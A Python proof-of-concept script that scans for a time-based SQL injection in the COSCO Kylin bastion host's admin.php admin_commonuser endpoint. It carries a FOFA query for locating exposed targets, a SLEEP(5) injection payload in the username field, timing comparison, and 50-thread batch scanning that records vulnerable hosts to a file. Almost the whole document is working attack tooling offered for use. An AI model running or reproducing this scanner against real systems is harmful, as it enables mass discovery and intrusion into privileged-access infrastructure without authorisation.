# 中远麒麟堡垒机SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="

def banner():
    test = """
███████╗██╗   ██╗ ██████╗ ██╗      ███████╗ ██████╗ ██╗     
╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║      ██╔════╝██╔═══██╗██║     
  ███╔╝  ╚████╔╝ ██║   ██║██║█████╗███████╗██║   ██║██║     
 ███╔╝    ╚██╔╝  ██║▄▄ ██║██║╚════╝╚════██║██║▄▄ ██║██║     
███████╗   ██║   ╚██████╔╝███████╗ ███████║╚██████╔╝███████╗
╚══════╝   ╚═╝    ╚══▀▀═╝ ╚══════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝

                        
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='中远麒麟堡垒机SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/admin.php?controller=admin_commonuser"
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36',
        'Connection': 'close',
        'Content-Length': '78',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip',
    }
    data1 = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    data2 = "username=admin"
    try:
        res1 = requests.post(url=target + api_payload, headers=headers, data=data1, verify=False)
        res2 = requests.post(url=target + api_payload, headers=headers, data=data2, verify=False)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 4:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()